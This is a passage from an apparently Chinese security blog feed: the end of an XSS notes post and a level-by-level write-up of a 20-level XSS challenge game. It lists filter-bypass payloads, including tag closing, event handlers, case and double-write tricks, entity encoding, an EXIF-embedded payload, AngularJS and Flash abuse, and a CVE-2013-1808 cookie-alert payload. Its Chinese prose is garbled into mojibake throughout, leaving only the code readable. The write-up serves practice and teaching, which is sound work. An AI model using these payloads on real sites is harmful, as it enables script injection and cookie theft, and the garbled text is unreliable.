<li>  ä¸€äº›è¿‡æ»¤åŒ¹é…ä»»ä½•æˆå¯¹çš„èµ·å§‹ä¸ç»“æŸå°–æ‹¬å·ï¼Œåˆ é™¤å…¶ä¸­çš„ä»»ä½•å†…å®¹ï¼Œä½†é€šå¸¸å¯ä»¥ä¾é å‘¨å›´ç°æœ‰çš„è¯­æ³•ï¼Œç»“æŸæ³¨å…¥çš„æ ‡ç­¾ï¼Œä»è€Œé¿å¼€è¿™ç§è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼šå¯ä»¥æ§åˆ¶ä¸‹é¢ä»£ç ä¸­çš„valueå±æ€§å€¼ï¼š<code>&lt;input type=&quot;hidden&quot; name=&quot;pageid&quot; value=&quot;foo&quot;&gt;</code>å°±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸ä¼šè¢«è¿‡æ»¤é˜»æ­¢çš„è„šæœ¬ï¼Œæ³¨å…¥ä¸€ä¸ªåŒ…å«JavaScriptçš„æ–°æ ‡ç­¾ï¼š<code>foo&quot;&gt;&lt;x styple=&quot; x:expression(alert(document.cookie))</code>è®¸å¤šæƒ…å†µä¸‹ï¼Œæµè§ˆå™¨æ¥å—æœªç»“æŸçš„HTMLæ ‡ç­¾ï¼›æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºé¿å¼€è¿‡æ»¤ã€‚é€šè¿‡æ„é€ ç±»ä¼¼ä¸‹é¢æ— æ•ˆçš„HTMLä»£ç ï¼š<code>&lt;img src=&quot;&quot; onerror=alert&#123;document.cookie&#125;</code></li>
<li>  ä¸€äº›è¿‡æ»¤åŒ¹é…æˆå¯¹çš„èµ·å§‹ä¸ç»“æŸå°–æ‹¬å·ï¼Œæå–å…¶ä¸­çš„å†…å®¹ï¼Œå¹¶å°†è¿™äº›å†…å®¹ä¸æ ‡ç­¾åç§°é»‘åå•è¿›è¡Œæ¯”è¾ƒã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨å¤šä½™çš„æ‹¬å·é¿å¼€è¿‡æ»¤ã€‚<code>&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;</code></li>
<li>  å³ä½¿ç©ºå­—èŠ‚åé¢çš„æ–‡æœ¬ä»ç„¶åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œä½†å¦‚æœé‡åˆ°ç©ºå­—èŠ‚ï¼Œä¸€äº›è¿‡æ»¤ä¼šåœæ­¢å¤„ç†å­—ç¬¦ä¸²ã€‚åœ¨è¢«è¿‡æ»¤çš„è¡¨è¾¾å¼å‰æ’å…¥ä¸€ä¸ªURLç¼–ç çš„ç©ºå­—èŠ‚å³å¯é¿å¼€è¿™ç§è¿‡æ»¤ã€‚<code>foo%00&lt;script&gt;</code></li>
<li>  å¦‚æœç”¨æˆ·æäº¤çš„æ•°æ®åœ¨åº”ç”¨è¿‡æ»¤åè¿˜è¿›è¡Œäº†è§„èŒƒåŒ–ï¼Œä»å¯ä»¥é€šè¿‡URLç¼–ç æˆ–åŒé‡ç¼–ç è¢«è¿‡æ»¤çš„è¡¨è¾¾å¼ï¼Œé¿å¼€è¿‡æ»¤ï¼Œå¹¶å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚</li>
<li>  åœ¨gbkæˆ–gbXXXç¼–ç ä¸­å¯ä»¥é€šè¿‡å®½å­—èŠ‚ç»•è¿‡<code>%bf\ã€%dfã€%81</code></li>
<li>  CRLFæ³¨å…¥ç»•è¿‡ï¼Œåˆ©ç”¨<code>\r\n</code>åœ¨HTTPå“åº”å¤´æ³¨å…¥å›è½¦æ¢è¡Œç¬¦ï¼Œå¹¶æ³¨å…¥X-XSS-Protection: 0ï¼Œå¯ä»¥é˜²æ­¢è„šæœ¬è¿è¡Œè¢«é˜»æ­¢ã€‚</li>
<li>  IEåŒåŸŸç™½åå•â€“Refereræ¥æºä¸ºæœ¬åŸŸåˆ™XSS Filterä¸ç”Ÿæ•ˆ</li>
<li>  ChormeåŒåŸŸç™½åå•â€“æ ‡ç­¾åµŒå…¥çš„æ˜¯åŒåŸŸå†…çš„jsæ–‡ä»¶ï¼ŒXSS Filterå°±ä¸ä¼šé˜²å¾¡</li>
<li>  ç¼–ç (urlç¼–ç ç­‰)</li>
<li>  ä»£ç æ··æ·†(ä¾‹å¦‚ï¼šjsfk)</li>
</ol>
<blockquote>
<blockquote>
<p>æ£€æµ‹æµç¨‹</p>
<p>1.è¾“å…¥ä»»æ„æ•°æ®ï¼Œå¯»æ‰¾è¾“å‡ºç‚¹</p>
<p>2.è¾“å…¥&lt; &gt; \ â€œ â€˜ / ç­‰å­—ç¬¦ï¼ŒæŸ¥çœ‹è¿‡æ»¤æƒ…å†µ</p>
<p>3.åˆ†æè¾“å‡ºæ‰€åœ¨çš„ç¯å¢ƒï¼ˆä»¥htmlè¿˜æ˜¯jsè§£æï¼‰</p>
<p>4.æ„é€ payload</p>
<p>5.ç›²æ‰“</p>
<p>å¸¸ç”¨è¯­å¥</p>
<p>â€¢<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>Â Â  å¼¹å‡ºæç¤ºæ¡†</p>
<p>â€¢<code>&lt;img src=â€œjavascript:alert(1)â€&gt;</code>Â Â Â Â Â Â Â Â  å¼¹å‡ºæç¤ºæ¡†</p>
<p>â€¢<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>Â Â Â Â  å¼¹å‡ºç”¨æˆ·COOKIES</p>
<p>â€¢<code>&lt;iframe src=http://www.baidu.com&gt;&lt;/iframe&gt;</code>Â  åœ¨å½“å‰é¡µæ’å…¥å¦ä¸€ç«™ç‚¹</p>
</blockquote>
<p>â€¢<a href="http://www.freebuf.com/sectool/4799.html">http://www.freebuf.com/sectool/4799.html</a>Â  Â Â  ï¼ˆbeef + msfï¼‰</p>
<p>â€¢<a href="http://www.freebuf.com/articles/web/24372.html">http://www.freebuf.com/articles/web/24372.html</a>Â  ï¼ˆxssf + msfï¼‰</p>
</blockquote>
<h2 id="0X08-é¢˜ç›®"><a href="#0X08-é¢˜ç›®" class="headerlink" title="0X08 é¢˜ç›®"></a>0X08 é¢˜ç›®</h2><p>1-<a href="http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php">â€”&gt;é“¾æ¥&lt;â€”</a>è¿™æ˜¯ä¸€ä¸ªXSSåŸºç¡€é¢˜</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/175900242.PNG" alt="mark"></p>
<p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;Â Â </code>ï¼Œå¼¹çª—æœ‰æç¤ºï¼š</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/180128794.png" alt="mark"></p>
<p>æŠŠ1æ¢æ‰å°±å‡ºflagäº†ã€‚ã€‚</p>
<p>2-<a href="http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php">â€”&gt;é“¾æ¥&lt;â€”</a></p>
<p>â€‹    è¾“å…¥ç¬¬ä¸€é¢˜çš„payloadï¼Œå‡ºç°è¿™ä¸ªï¼Œxssè¢«æ£€æµ‹å‡ºæ¥äº†ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170313/234247518.png" alt="mark"></p>
<p>â€‹    å°±ä¸èƒ½è¿™æ ·å†™äº†ï¼Œè¦æƒ³åŠæ³•ç»•è¿‡ã€‚</p>
<p>â€‹    è¾“å…¥<code>&lt;img src=# onerror=alert(&quot;success!&quot;) /&gt;</code>ï¼Œè¿‡ï¼Œå¾—flagã€‚</p>
<p>â€‹    åŸå› å¦‚ä¸‹ï¼šç”¨çš„imgæ ‡ç­¾ï¼Œsrcå¹¶æ²¡æœ‰ç»™å‡ºå›¾ç‰‡è·¯å¾„ã€‚å½“å›¾ç‰‡æ²¡æœ‰æ‰¾åˆ°è·¯å¾„ï¼ˆå³src=â€œè·¯å¾„â€œæ‰¾ä¸åˆ°å›¾ç‰‡ï¼‰å°±ä¼šå¼¹å‡ºæ¶ˆæ¯æ¡†,è¿™ä¸ªå°±æ˜¯onerror=alert(xxxx)èµ·çš„ä½œç”¨ã€‚</p>
<p>3<a href="http://192.168.139.231/web20/xss/index.php">â€”&gt;é“¾æ¥&lt;â€”</a></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170315/193427419.png" alt="mark"></p>
<p>æœ‰æç¤ºï¼Œè¦å¼¹å‡ºcookieï¼Œè¿˜æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥è¾“å…¥<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>å°±OKäº†ã€‚</p>
<p>4.</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170316/193146060.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170316/170834852.png" alt="mark"></p>
<p>â€‹    onmouseenteräº‹ä»¶ â€”å½“é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°å›¾åƒæ—¶æ‰§è¡Œ JavaScript</p>
<p>â€‹    å°†onmouseenteræ·»åŠ åˆ°è¾“å…¥æ¡†çš„æ ‡ç­¾ä¸­ï¼Œå½“é¼ æ ‡ç‚¹å‡»æ—¶æ‰§è¡Œjsä»£ç ã€‚</p>
]]></content>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>XSSé—¯å…³æ¸¸æˆè§£é¢˜è®°å½•</title>
    <url>/2019/02/01/xss-chuang-guan-you-xi-jie-ti-ji-lu/</url>
    <content><![CDATA[<blockquote>
<p>ä»Šå¤©åœ¨ç½‘ä¸Šçœ‹åˆ°äº†è¿™ä¸ªXssçš„é—¯å…³ï¼Œå°±ä¸‹ä¸‹æ¥åšäº†ä¸€ä¸‹ã€‚é¢˜ç›®æ¯”è¾ƒåŸºç¡€ï¼ˆæœ‰å‡ ä¸ªè¿˜ä¸é”™ï¼‰ï¼Œä½†å†™éƒ½å†™äº†å°±å‘ä¸Šæ¥å§ã€‚æ­£å¥½å†æ‰¾ä¸€äº›é¢˜ç›®é¡ºä¾¿æ€»ç»“ä¸€ä¸‹ï¼Œä»¥åæ¥ç€æ›´æ–°ã€‚</p>
</blockquote>
<a id="more"></a>

<blockquote>
<p>é¢˜ç›®æºç ï¼š</p>
<p>ä¸‹è½½:<a href="https://www.lanzous.com/i32ah6d">https://www.lanzous.com/i32ah6d</a> å¯†ç :h3fo</p>
</blockquote>
<h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥XSSè¯­å¥å¼¹çª—ï¼Œè¿›å…¥ä¸‹ä¸€å…³ã€‚</p>
<p>payloadï¼š</p>
<pre><code>level1.php?name=1&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;;</code></pre>
<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>æœ‰æœç´¢æ¡†ï¼Œéšä¾¿è¾“å…¥æµ‹è¯•ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°è¾“å…¥çš„å€¼ç›´æ¥èµ‹å€¼ç»™äº†valueå¹¶åœ¨inputæ ‡ç­¾ä¸­ã€‚æˆ‘ä»¬é—­åˆæ‰å‰åçš„æ ‡ç­¾å°±å¯ä»¥äº†ã€‚</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l2-1.png"></p>
<p>Payload:</p>
<pre><code>level2.php?keyword=111&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;&amp;submit=æœç´¢</code></pre>
<h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>å’Œlevel2çš„å¸ƒå±€ä¸€æ ·ï¼Œè¾“å…¥å€¼ä¼šä½œä¸ºvalueå€¼æ”¾åœ¨inputæ ‡ç­¾ä¸­ï¼Œä¸åŒçš„æ˜¯è½¬ä¹‰äº†å°–æ‹¬å·ã€‚</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l3-1.png"></p>
<p>ä½†æ˜¯å¯ä»¥ä½¿ç”¨onclickç­‰äº‹ä»¶æ¥å¼¹çª—ã€‚</p>
<p>Payload:</p>
<pre><code>1&#39; onclick=alert(&#39;xss&#39;)//
1&#39; oninput=alert(&#39;xss&#39;)//</code></pre>
<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>==?</p>
<p>å’ŒL3çš„payloadä¸€æ ·å°±è¿‡äº†ã€‚ã€‚ï¼ˆæ¢æˆäº†åŒå¼•å·ï¼‰</p>
<h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><p>å°†scriptå’Œonè¿›è¡Œäº†replaceï¼Œåœ¨å•è¯ä¸­é—´æ’å…¥äº†<code>_</code>ã€‚è¿™æ ·å°±è¿‡æ»¤äº†scriptæ ‡ç­¾å’Œä¸€ä¼—äº‹ä»¶è§¦å‘xssã€‚</p>
<p>ä½¿ç”¨aæ ‡ç­¾+javascriptä¼ªåè®®æ¥è§¦å‘ã€‚ï¼ˆjavascriptä¸ºä»€ä¹ˆæ²¡è¢«æ›¿æ¢ï¼Œçœ‹äº†ä¸€ä¸‹æºç æ›¿æ¢çš„æ˜¯&lt;scriptï¼‰</p>
<p>Payload:</p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;&lt;&quot;</code></pre>
<h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><p>href src on &lt;scriptè¢«æ›¿æ¢ã€‚</p>
<p>è¿‡æ»¤è¯å¤§å†™ç»•è¿‡ã€‚</p>
<p>çœ‹äº†ä¸€ä¸‹ä»£ç ï¼ŒL5å°†è¾“å…¥å…¨éƒ¨è½¬å°å†™è¿™ä¸ªæ²¡æœ‰æ‰€ä»¥å¯ä»¥ä½¿ç”¨å¤§äº›ç»•è¿‡ã€‚</p>
<p>Payload:</p>
<pre><code>&quot;&gt;&lt;a HREF=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;&lt;&quot;
&quot;&gt;&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;</code></pre>
<h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><p>æµ‹è¯•åå‘ç°ä¼šè®²script hrefç­‰æ•æ„Ÿè¯æ›¿æ¢æˆç©ºã€‚</p>
<p>åŒå†™ç»•è¿‡ã€‚</p>
<p>Payload:</p>
<pre><code>&quot;&gt;&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scrscriptipt&gt;&lt;&quot;</code></pre>
<h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><p>è¾“å…¥æ¡†æ·»åŠ å‹æƒ…é“¾æ¥ï¼Œè¾“å…¥å€¼ä½œä¸ºä¸‹é¢è¶…é“¾æ¥aæ ‡ç­¾hrefçš„å€¼ã€‚ä½†æ˜¯script onç­‰æ•æ„Ÿè¯è¢«è¿‡æ»¤äº†ã€‚</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l8-1.png"></p>
<p><img src="https://lanvnal.github.io/images/xss_game/l8-2.png"></p>
<p>ä½¿ç”¨htmlå®ä½“ç¼–ç ç»•è¿‡ã€‚</p>
<p>Payloadï¼š</p>
<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&amp;#59;</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l8-3.png"></p>
<h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><p>è¦æ±‚è¾“å…¥çš„å†…å®¹åŒ…å«http://</p>
<p>æ²¡æœ‰è¦æ±‚http://åœ¨é¦–éƒ¨ï¼Œæ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p>
<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&amp;#59;//http://</code></pre>
<h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><p>çœ‹æºç å‘ç°æœ‰3ä¸ªinputæ ‡ç­¾ï¼Œä½†ç±»å‹å…¨æ˜¯hiddenã€‚é€šè¿‡æ‹¼æ¥<code>?t_link=aaa&amp;t_history=aaa&amp;t_sort=aaa</code>æµ‹è¯•å‘ç°åªæœ‰t_sortè¿™ä¸ªinputä¼šè·å–è¾“å…¥å€¼ä½œä¸ºvalueå€¼ã€‚</p>
<p>é€šè¿‡onclickäº‹ä»¶è§¦å‘xssï¼Œè¦æ›´æ”¹ä¸€ä¸‹typeã€‚</p>
<p>Payloadï¼š</p>
<pre><code>?t_sort=&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;//</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l10-1.png"></p>
<h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><p>L10çš„payloadä¸­<code>&quot;</code>è¢«è½¬ä¹‰äº†ï¼Œä½¿ç”¨äº†<code>htmlspecialchars</code>å‡½æ•°å¤„ç†å†è¾“å‡ºçš„ç¼˜æ•…ã€‚</p>
<p>ä½†æ˜¯é€šè¿‡æºç å‘ç°å¤šäº†ä¸€ä¸ªnameä¸ºt_refçš„inputã€‚</p>
<pre><code>&lt;input name=&quot;t_ref&quot; value=&quot;http://test.xss.tv/level10.php?t_link=aaa&amp;amp;t_history=aaa&amp;amp;t_sort=%22%20onclick=alert(%27xss%27)%20type=%22text%22//&quot; type=&quot;hidden&quot;&gt;</code></pre>
<p>ä»–çš„å€¼æ˜¯è·³è½¬è¿‡æ¥çš„ä¸Šä¸ªé¡µé¢çš„é“¾æ¥ã€‚æŠ“åŒ…æ”¹refererã€‚</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l11-1.png"></p>
<h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><p>å¾—ï¼Œè¿™æ¬¡æ”¹UAã€‚</p>
<h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>å¾—ï¼Œæ”¹cookie</p>
<h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>Exif Xss</p>
<p>å› ä¸ºé¢˜ç›®é€šè¿‡iframeåµŒå¥—äº†<a href="http://www.exifviewer.org/%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95%E3%80%82%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E6%98%BE%E7%A4%BAexif%E4%BF%A1%E6%81%AF%E3%80%82%E6%89%80%E4%BB%A5%E8%87%AA%E5%B7%B1%E5%86%99%E4%BA%86%E4%B8%80%E4%B8%AA%E6%9D%A5%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E3%80%82">http://www.exifviewer.org/ä½†æ˜¯è¿™ä¸ªç½‘ç«™éœ€è¦ç™»å½•ã€‚å…¶å®å°±æ˜¯æ˜¾ç¤ºexifä¿¡æ¯ã€‚æ‰€ä»¥è‡ªå·±å†™äº†ä¸€ä¸ªæ¥å¤ç°ä¸€ä¸‹ã€‚</a></p>
<pre><code class="php">&lt;h1&gt;Test EXIF XSS&lt;/h1&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; id=&quot;File&quot; name=&quot;file&quot;/&gt;
    &lt;input type=&quot;submit&quot;  name=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;?php
//error_reporting(0);
if(isset($_POST[&#39;submit&#39;]))&#123;
    $file = $_FILES[&#39;file&#39;];
    $filetmps = $file[&#39;tmp_name&#39;];

    $exif = exif_read_data($file[&#39;tmp_name&#39;], 0, true);

    foreach ($exif as $key =&gt; $section) &#123;
        foreach ($section as $name =&gt; $val) &#123;
            echo &quot;$key.$name: $val&lt;br /&gt;\n&quot;;
        &#125;
    &#125;
&#125;
?&gt;</code></pre>
<p>é€šè¿‡<a href="https://sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>æ¥åˆ¶ä½œä¸€å¼ ä¼ªé€ exifçš„å›¾ç‰‡ã€‚(å¦‚ä¸‹ä¿®æ”¹äº†Artist)</p>
<pre><code>exiftool -Artist=&#39; &quot;&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;&#39; logo.jpg</code></pre>
<p>é€šè¿‡phpçš„<code>exif_read_data</code>å‡½æ•°è¯»å‡ºexifä¿¡æ¯ï¼Œè¯»å‡ºçš„å€¼ç›´æ¥æœªç»è¿‡æ»¤çš„è¾“å‡ºï¼Œå°±ä¼šå¯¼è‡´Xssçš„å‘ç”Ÿã€‚</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l14-1.png"></p>
<h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><p>é€šè¿‡é¡µé¢æºç çš„headä¿¡æ¯å‘ç°å¼•å…¥äº†<code>AngularJS</code>ï¼Œè€ƒè™‘<code>AngularJS</code>æ¡†æ¶çš„xssåˆ©ç”¨ã€‚</p>
<pre><code class="javascript">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;</code></pre>
<p>å¯ä»¥å‘ç°ç‰ˆæœ¬ä¸º1.2.0ï¼Œè¯•äº†è¯•å‘ç°äº†ä¸€è¡Œ<code>&lt;!--  ngInclude: undefined --&gt;    </code>ï¼Œå‘ç°è¿™æ˜¯ä½¿ç”¨äº†AngularJSçš„ <code>ng-include</code> æŒ‡ä»¤æ¥åŒ…å«æ–‡ä»¶ã€‚</p>
<p>åœ¨æœ¬æœºå†™ä¸€ä¸ªåŒ…å«XSSä»£ç çš„htmlæ–‡ä»¶ï¼Œå»åŒ…å«ã€‚</p>
<pre><code class="html">&lt;input type=&quot;text&quot; name=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;</code></pre>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level15.php?src=&quot;http://localhost/index.html&quot;</code></pre>
<p>æ•ˆæœï¼š</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l15-3.png"></p>
<p><img src="https://lanvnal.github.io/images/xss_game/l15-2.png"></p>
<blockquote>
<p>AngularJSæ˜¯ä¸€ä¸ªè°·æ­Œå¼€å‘çš„MVCå®¢æˆ·ç«¯æ¡†æ¶ã€‚ä½¿ç”¨AngularJSå¯ä»¥å¯¹åŒ…æ¶µæœ‰<em>ng-app</em>æ ‡ç­¾çš„æ¨¡ç‰ˆè¿›è¡Œå®¢æˆ·ç«¯çš„æ¸²æŸ“<em>ï¼Œ</em>ä»–å¯ä»¥é€šè¿‡æ’å…¥ä¸€ä¸ªç‰¹å®šçš„æ ‡ç­¾ï¼Œç„¶åå¯¹è¿™ä¸ªæ ‡ç­¾å†…çš„å†…å®¹è¿›è¡Œè§£æï¼Œè¾¾åˆ°æ¸²æŸ“æ¨¡ç‰ˆçš„æ•ˆæœï¼Œæ­£æ˜¯å› ä¸ºè¿™ä¸ªç‰¹æ€§ï¼Œæ‰€ä»¥å¯¼è‡´äº†æˆ‘ä»¬ä¸éœ€è¦ä½¿ç”¨htmlæ ‡ç­¾ï¼Œåªèƒ½è¦æˆ‘ä»¬è¾“å…¥çš„å†…å®¹èƒ½å¤Ÿè¾“å‡ºåœ¨<em>ng-app</em>æ ‡ç­¾å†…å°±å¯ä»¥é…åˆAngularJSçš„æ ‡ç­¾æ¥è¿›è¡Œxssã€‚</p>
</blockquote>
<pre><code>æœ¬é¢˜çš„AngularJSåˆ©ç”¨è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿˜æ²¡æœ‰éœ€è¦ç»•è¿‡è¿›è¡Œxssã€‚</code></pre>
<h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><p>è¾“å…¥å€¼è¢«æ”¾åœ¨centeræ ‡ç­¾ä¸­äº†ã€‚å°è¯•ä½¿ç”¨imgæ ‡ç­¾å¼¹çª—ã€‚</p>
<pre><code class="html">&lt;img src=&#39;1&#39; onerror=alert(&#39;xss&#39;)&gt;</code></pre>
<p>æŸ¥çœ‹æºç å‘ç°ç©ºæ ¼è¢«è½¬ä¹‰äº†ï¼Œç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ã€‚</p>
<pre><code>localhost/xss_game/level16.php?keyword=&lt;img%0asrc=&#39;1&#39;%0aonerror=alert(&#39;xss&#39;)&gt;</code></pre>
<h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><p>æœ‰ä¸ªflashï¼Œä½†æ˜¯å’Œflashæ²¡å•¥å…³ç³»ã€‚åœ¨embedæ ‡ç­¾ä¸­æ’å…¥è§¦å‘äº‹ä»¶ã€‚</p>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level17.php?arg01=q&amp;arg02=q onmouseover=alert(&#39;xss&#39;)</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l17-1.png"></p>
<p><img src="../images/xss_game/l17-2.png"></p>
<p>é¢˜ç›®ä»£ç æ˜¯è¿™ä¹ˆå†™çš„ï¼š</p>
<pre><code class="php">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></pre>
<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>Emmm,L17çš„payloadç›´æ¥è¿‡äº†ã€‚</p>
<h2 id="Level19"><a href="#Level19" class="headerlink" title="Level19"></a>Level19</h2><p>flashçš„xss</p>
<p>ä½¿ç”¨<a href="https://github.com/jindrapetrik/jpexs-decompiler">FFDec</a>åç¼–è¯‘xsf03.swfæ–‡ä»¶ã€‚</p>
<p>æœ‰åœ°æ–¹ç”¨åˆ°äº†geturlå‡½æ•°ï¼Œåˆ©ç”¨è¿™ä¸ªå‡½æ•°èƒ½è‡ªåŠ¨æ‰“å¼€æŒ‡å®šçš„ç½‘é¡µã€‚ä¸‹é¢çœ‹æ€ä¹ˆåˆ©ç”¨ã€‚</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l19-1.png"></p>
<p>ç„¶åè¿½è¸ªåˆ°sIFRçš„ä½ç½®ã€‚ä»ä¸‹é¢è¿™æ®µä»£ç å¯ä»¥çœ‹å‡ºversionå€¼èµ‹ç»™äº†<code>_loc4_</code>ï¼Œè¯•äº†ä¸€ä¸‹<code>arg01=version&amp;arg02=aaa</code>å‘ç°å…¶ä¸­ä¸€æ®µå€¼å˜æˆaaa.ä¹Ÿå°±æ˜¯è·å–çš„å€¼è¾“å‡ºäº†ã€‚</p>
<pre><code class="javascript"> if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION)
      &#123;
         _loc4_ = sIFR.VERSION_WARNING.split(&quot;%s&quot;).join(_root.version);
      &#125;</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l19-2.png"></p>
<p><img src="https://lanvnal.github.io/images/xss_game/l19-3.png"></p>
<p>å› ä¸ºgetURLåªåœ¨å†…å®¹ä¸ºlinkæ—¶æ‰“å¼€ï¼Œæ‰€ä»¥åˆ†æcontentIsLinkå‡½æ•°ã€‚</p>
<pre><code class="javascript">function contentIsLink()
   &#123;
      return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);
   &#125;</code></pre>
<p>é‚£æˆ‘ä»¬å°±é€šè¿‡aæ ‡ç­¾æ¥è§¦å‘xssã€‚</p>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;xss&lt;/a&gt;</code></pre>
<h2 id="Level20"><a href="#Level20" class="headerlink" title="Level20"></a>Level20</h2><p>æ‹–åˆ°FFDecçœ‹ä¸€ä¸‹ï¼Œå‘ç°äº†zeroclipboard.swf.</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l20-1.png"></p>
<pre><code>æœç´¢åå‘ç°æ˜¯zeroclipboard.swfçš„æ¼æ´ï¼Œè¯¦è§[CVE-2013-1808](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1808)ã€‚</code></pre>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level20.php?arg01=id&amp;arg02=\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//&amp;width&amp;height</code></pre>
<blockquote>
<p><a href="https://www.anquanke.com/vul/id/1168940">https://www.anquanke.com/vul/id/1168940</a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
        <tag>XSS</tag>
